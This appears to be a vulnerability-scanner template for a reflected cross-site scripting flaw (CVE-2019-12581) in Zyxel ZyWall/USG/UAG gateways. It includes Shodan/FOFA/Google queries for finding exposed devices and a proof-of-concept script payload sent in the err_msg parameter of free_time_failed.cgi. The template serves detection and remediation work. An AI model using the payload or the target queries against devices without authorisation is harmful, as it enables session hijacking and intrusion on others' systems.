id: CVE-2019-12581

info:
  name: Zyxel ZyWal/USG/UAG Devices - Cross-Site Scripting
  author: n-thumann
  severity: medium
  description: Zyxel ZyWall, USG, and UAG devices allow remote attackers to inject arbitrary web script or HTML via the err_msg parameter free_time_failed.cgi CGI program, aka reflective cross-site scripting.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary script code in the context of the victim's browser, leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Apply the latest firmware update provided by Zyxel to fix the XSS vulnerability.
  reference:
    - https://www.zyxel.com/support/vulnerabilities-related-to-the-Free-Time-feature.shtml
    - https://sec-consult.com/vulnerability-lab/advisory/reflected-cross-site-scripting-in-zxel-zywall/
    - https://n-thumann.de/blog/zyxel-gateways-missing-access-control-in-account-generator-xss/
    - https://nvd.nist.gov/vuln/detail/CVE-2019-12581
    - https://www.zyxel.com/us/en/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2019-12581
    cwe-id: CWE-79
    epss-score: 0.59573
    epss-percentile: 0.9818
    cpe: cpe:2.3:h:zyxel:uag2100:-:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: zyxel
    product: uag2100
    shodan-query: http.title:"ZyWall"
    fofa-query: title="zywall"
    google-query: intitle:"zywall"
  tags: cve,cve2019,zyxel,zywall,xss,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/free_time_failed.cgi?err_msg=<script>alert(document.domain);</script>"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(document.domain);</script>"
          - "Please contact with administrator."
        condition: and

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
# digest: 4a0a0047304502205688522d17dc28761f0065da444ba9c6e8634ae01ec7963176d34e66151ed1cb022100f37fdacfc0fa398c391a5c0cf73355ffa02be657c50c0e243e5d0454ea118ce7:922c64590222798bb761d5b6d8e72950